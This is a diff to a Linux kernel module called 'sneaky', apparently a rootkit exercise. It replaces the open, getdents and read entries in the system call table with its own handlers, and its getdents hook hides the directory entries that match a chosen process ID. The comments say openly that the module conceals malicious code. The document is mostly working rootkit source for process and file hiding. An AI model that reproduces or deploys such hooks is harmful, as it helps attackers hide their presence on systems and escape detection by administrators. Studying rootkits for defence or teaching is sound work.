@@ -90,9 +90,9 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd,
         strcmp(evil->dname, sneaky_pid) == 0) ) {
 
         memcpy(init + position, init + position + evil->d_reclen,
-               read_len - (position +
-                           evil->d_reclen)); // delete this sub dire/file by
-                                             // moving things behind it forward
+               read_len -
+                   (position + evil->d_reclen)); // delete this sub dire/file by
+        // moving things behind it forward
         evil -= evil->d_reclen;
       }
     else {
@@ -144,8 +144,12 @@ static int initialize_sneaky_module(void) {
   // This is the magic! Save away the original 'open' system call
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
-  original_call = (void *)*(sys_call_table + __NR_open);
+  original_open = (void *)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+  original_getdents = (void *)*(sys_call_table + __NR_getdents);
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
+  original_read = (void *)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
   // Revert page to read-only
   pages_ro(page_ptr, 1);
@@ -171,7 +175,9 @@ static void exit_sneaky_module(void) {
 
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
-  *(sys_call_table + __NR_open) = (unsigned long)original_call;
+  *(sys_call_table + __NR_open) = (unsigned long)original_open;
+  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
+  *(sys_call_table + __NR_read) = (unsigned long)original_read;
 
   // Revert page to read-only
   pages_ro(page_ptr, 1);
